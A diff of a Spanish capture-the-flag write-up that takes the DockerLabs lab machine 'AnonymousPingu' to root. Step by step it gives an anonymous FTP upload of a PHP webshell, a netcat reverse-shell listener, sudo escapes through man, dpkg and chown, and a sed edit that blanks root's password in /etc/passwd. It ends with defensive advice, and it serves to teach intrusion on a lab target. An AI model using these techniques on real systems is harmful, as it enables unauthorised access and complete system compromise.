@@ -1,79 +1,230 @@
-# ANONYMOUSPINGU — DockerLabs
+# AnonymousPingu — DockerLabs
 
 **Plataforma:** DockerLabs  
 **Dificultad:** 🟢 Fácil  
 **SO:** Linux  
+**Autor de la máquina:** El Pingüino de Mario  
+**Fecha de creación:** 29/04/2024  
+**Técnicas:** Nmap · Dirb · FTP anónimo · PHP webshell · Reverse Shell · Escalada encadenada (man→pingu→gladys→chown) · Modificación /etc/passwd
 
 ---
 
-## Resumen
+## Índice
 
-Resolución de la máquina **ANONYMOUSPINGU** de DockerLabs.
+1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
+2. [Enumeración web con Dirb](#2-enumeración-web-con-dirb)
+3. [FTP anónimo — subida de webshell](#3-ftp-anónimo--subida-de-webshell)
+4. [Reverse Shell](#4-reverse-shell)
+5. [Escalada encadenada — www-data → pingu → gladys → root](#5-escalada-encadenada--www-data--pingu--gladys--root)
+6. [Lección aprendida](#6-lección-aprendida)
 
 ---
 
-## 1. Reconocimiento
+## 1. Despliegue y reconocimiento
 
-Vamos a desplegar la maquina vulnerable.
+```bash
+sudo bash auto_deploy.sh anonymouspingu.tar
+```
 
-Haremos un escaneo profundo de los puertos de la máquina.
+> IP asignada: `172.17.0.2`.
 
-Vemos que cuenta con un servidor web, así que exploraremos a ver si
-encontramos algo interesante.
+Escaneo completo:
 
-## 2. Enumeración
+```bash
+sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
+cat Puertos
+```
 
-Con dirb vamos a ver que encontramos algunos directorios escondidos.
+```
+PORT   STATE SERVICE  REASON
+21/tcp open  ftp      syn-ack ttl 64
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r-- 1 0 0  7816 about.html
+| -rw-r--r-- 1 0 0  8102 contact.html
+| drwxrwxrwx 1 33 33  4096 upload   [NSE: writeable]
+80/tcp open  http     syn-ack ttl 64
+|_http-title: Mantenimiento
+```
 
-Como vimos contamos con el servicio ftp y en el propio escaneo nos dice que el
-usuario Anonymous está habilitada, así que miraremos que nos podemos
-encontrar.
+> 💡 Nmap ya nos dice dos cosas críticas: FTP anónimo habilitado y el directorio `upload` tiene permisos de **escritura** (`drwxrwxrwx`). Esto es un vector claro para subir una webshell.
 
-Vemos que contamos con todos los permisos en el directorio upload que esta
-vacío por el momento.
+---
 
-## 3. Explotación
+## 2. Enumeración web con Dirb
 
-Desde nuestro host vamos a crear este fichero de prueba en php para luego poder
-ejecutar una reverse Shell.
+```bash
+dirb http://172.17.0.2
+```
 
-Lo subimos al servidor fpt
+```
+==> DIRECTORY: http://172.17.0.2/upload/
+```
 
-Y ahora vamos a ejecutar la reverse Shell
+El directorio `/upload/` corresponde exactamente al directorio del FTP. Si subimos un PHP por FTP, lo podemos ejecutar desde el navegador en `/upload/`.
 
-## 4. Post-explotación
+---
 
-Vemos que estamos dentro y vamos a ver como podemos escalar privilegios con
-gtfobins.
+## 3. FTP anónimo — subida de webshell
 
-Una vez dentro del usuario vamos a seguir encontrando otro usuario con el cual
-escalaremos también.
+Conectamos al FTP como anonymous (sin contraseña):
 
-Ahora vemos que contamos con el binario de chown, que buscando un poco
-podemos editar un fichero que elijamos, en este caso será el /etc/passwd para
-poder quitar la contraseña del usuario root.
+```bash
+ftp 172.17.0.2
+```
 
-## 5. Escalada de privilegios
+```
+Name (172.17.0.2:caan31): anonymous
+230 Login successful.
+ftp> ls -la
+drwxrwxrwx  1 33 33  4096 Apr 28 2024 upload
+ftp> cd upload
+```
 
-Como vemos el usuario root cuenta con contraseña (x), lo que intentaremos será
-quitarle la contraseña a este usuario.
+Creamos la webshell en nuestra máquina:
 
-Ejecutamos los comandos que nos da gtfobins con el directorio que nosotros
-queramos en este caso /etc.
+```bash
+nano prueba.php
+```
 
-Y ahora con sed -i vamos a reemplazar texto en el archivo
-s → significa “substituir”.
-root:x: → es el texto que busca.
-root:: → es el texto que pone en su lugar.
-g → significa que haga el reemplazo en todas las coincidencias de cada línea
+```php
+<?php
+system($_GET['cmd']);
+?>
+```
+
+La subimos al FTP:
+
+```bash
+ftp> put prueba.php
+226 Transfer complete.
+ftp> ls -la
+-rwxr-xr-x  1 101 103  33 Sep 24 17:11 prueba.php
+```
+
+Verificamos RCE desde el navegador:
+
+```
+http://172.17.0.2/upload/prueba.php?cmd=id
+```
+
+> RCE confirmada como `www-data`.
+
+---
+
+## 4. Reverse Shell
+
+Ponemos Netcat a escuchar:
+
+```bash
+sudo nc -lvnp 443
+```
+
+Desde [revshells.com](https://www.revshells.com/) generamos el payload Bash con nuestra IP y puerto 443, lo enviamos URL-encodeado al parámetro `cmd`. Recibimos la conexión:
+
+```bash
+www-data@f69381b9c5c6:/var/www/html/upload$
+```
+
+---
+
+## 5. Escalada encadenada — www-data → pingu → gladys → root
+
+### www-data → pingu (man/sudo)
+
+```bash
+www-data@f69381b9c5c6:/var/www/html/upload$ sudo -l
+```
+
+```
+User www-data may run the following commands on f69381b9c5c6:
+    (pingu) NOPASSWD: /usr/bin/man
+```
+
+GTFObins para `man` con sudo:
+
+```bash
+www-data@f69381b9c5c6:/var/www/html/upload$ sudo -u pingu /usr/bin/man man
+!/bin/sh
+$ whoami
+pingu
+```
+
+### pingu → gladys (dpkg/sudo)
+
+```bash
+pingu@f69381b9c5c6:~$ sudo -l
+```
+
+```
+User pingu may run the following commands on f69381b9c5c6:
+    (gladys) NOPASSWD: /usr/bin/nmap
+    (gladys) NOPASSWD: /usr/bin/dpkg
+```
+
+GTFObins para `dpkg` con sudo:
+
+```bash
+pingu@f69381b9c5c6:~$ sudo -u gladys /usr/bin/dpkg -l
+!/bin/sh
+$ whoami
+gladys
+```
+
+### gladys → root (chown/sudo + modificación /etc/passwd)
+
+```bash
+gladys@f69381b9c5c6:~$ sudo -l
+```
+
+```
+User gladys may run the following commands on f69381b9c5c6:
+    (root) NOPASSWD: /usr/bin/chown
+```
+
+> 💡 **chown** con sudo nos permite cambiar el propietario de cualquier fichero del sistema. La estrategia es hacer que `/etc/passwd` nos pertenezca para luego poder editarlo y eliminar la contraseña de root.
+
+GTFObins para `chown`:
+
+```bash
+gladys@f69381b9c5c6:~$ LFILE=/etc
+gladys@f69381b9c5c6:~$ sudo chown $(id -un):$(id -gn) $LFILE
+```
+
+Leemos `/etc/passwd` — root tiene la `x` que indica que usa contraseña:
+
+```bash
+gladys@f69381b9c5c6:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+```
+
+Usamos `sed -i` para eliminar la `x` de root (quitar contraseña):
+
+```bash
+gladys@f69381b9c5c6:~$ /usr/bin/sed -i 's/root:x:/root::/g' /etc/passwd
+gladys@f69381b9c5c6:~$ su root
+root@f69381b9c5c6:/home/gladys# whoami
+root
+```
+
+✅ Somos **root** — root ya no tiene contraseña.
+
+---
 
 ## 6. Lección aprendida
 
-Esta máquina enseña a encadenar técnicas de reconocimiento, enumeración y explotación para comprometer un sistema Linux y escalar hasta root.
+| Vulnerabilidad | Dónde | Impacto |
+|----------------|-------|---------|
+| **FTP anónimo con directorio upload escribible al webroot** | Puerto 21 | Upload de webshell → RCE |
+| **Cadena de escalada: man → dpkg → chown** | Sudoers de www-data/pingu/gladys | Escalada multi-usuario hasta root |
+| **chown en /etc permite editar passwd** | Fichero de sistema | Eliminación de contraseña de root |
 
-> 💡 **Consejo para principiantes:** Si te atascas, vuelve al paso de enumeración — casi siempre hay algo que no viste la primera vez.
+**Para defenderse:**
+- FTP anónimo con escritura al webroot es una combinación catastrófica — deshabilitar siempre el acceso anónimo FTP.
+- La escalada encadenada muestra que cada binario sudo inseguro es un eslabón. Revisar `sudo -l` de **todos** los usuarios del sistema.
+- `/etc/passwd` debe pertenecer a root:root con permisos 644. Monitorizar cambios de propietario con auditd.
+- Si se necesita que varios usuarios escalen privilegios, usar grupos con permisos específicos en lugar de sudoers con binarios completos.
 
 ---
 
-*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs*  
+*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
 *¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
